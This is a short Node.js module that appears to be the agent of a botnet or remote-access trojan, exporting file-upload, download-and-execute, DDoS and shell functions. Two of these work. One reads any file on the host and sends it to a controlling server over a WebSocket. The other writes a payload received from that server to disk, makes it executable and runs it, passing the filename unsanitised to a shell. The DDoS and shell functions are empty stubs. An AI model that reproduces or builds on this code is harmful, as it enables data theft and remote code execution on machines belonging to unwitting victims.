const fs = require('fs');
const { exec } = require('child_process');
function send_file_to_sv(id, name, filepath, webSocket, hash){
    // Open file

    try {
        const data = fs.readFileSync(filepath, 'utf-8');
        // TODO optional hash for integrity check
        const result = {
            id,
            type: "Download",
            name: name,
            hash: 0,
            data: data
        };
        webSocket.send(JSON.stringify(result));
    } catch (err) {
        console.error("Error reading file:", err)
    }

}

function ddos(id, url, port){
    return 0;
}

function execute(id, data, filename){

    try {
        fs.writeFileSync("./" + filename, data, 'utf8');
        console.log("Data written to file successfully!");
    } catch (err) {
        console.error("Error writing to file:", err);
        return;
    }

    exec('chmod +x ' + filename + ' && ./' + filename, (error, stdout, stderr) => {
        if (error) {
            console.error(`Error: ${error.message}`);
            return;
        }

        if (stderr) {
            console.error(`Standard Error: ${stderr}`);
            return;
        }
        console.log(`Standard Output: ${stdout}`);
    });

    return 0;
}

function start_shell(id){
    return 0;
}

module.exports = { send_file_to_sv, ddos, execute, start_shell }